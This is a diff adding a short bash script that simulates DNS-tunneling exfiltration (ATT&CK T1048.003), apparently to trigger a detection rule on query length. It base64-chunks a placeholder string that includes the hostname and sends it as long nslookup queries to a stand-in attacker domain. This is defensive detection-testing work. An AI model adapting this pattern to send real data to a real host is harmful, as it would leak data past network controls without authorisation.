@@ -1,0 +1,12 @@
+#!/bin/bash
+
+echo -e `date +"%Y-%m-%d %H:%M:%S"` "\e[92m[T1048.003] DNS tunneling / data exfiltration: data is base64-chunked and smuggled out as long DNS subdomain lookups to an attacker domain, bypassing egress controls that allow DNS. Detection keys on query length (>150 chars).\033[m"
+# SIMULATION ONLY: exfiltrates a harmless placeholder (NOT real data) to a non-resolvable
+# .example domain. Query names are built >150 chars (base64 split into <=60-char labels)
+# so they exceed the DNS-tunneling rule's length threshold.
+DATA="SIMULATION-ONLY-not-real-data-padded-to-comfortably-exceed-the-dns-query-length-threshold-of-150-characters-used-by-the-tunneling-rule-$(hostname 2>/dev/null)-$(date +%s)"
+B64=$(printf '%s' "$DATA" | base64 | tr -d '\n=')
+NAME=$(printf '%s' "$B64" | fold -w 60 | paste -sd. -)
+QUERY="$NAME.attacker-collector.example"
+for i in 1 2 3; do nslookup "$QUERY" >/dev/null 2>&1; sleep 1; done
+echo "  (sent DNS lookups of ${#QUERY} chars to a non-resolvable domain)"
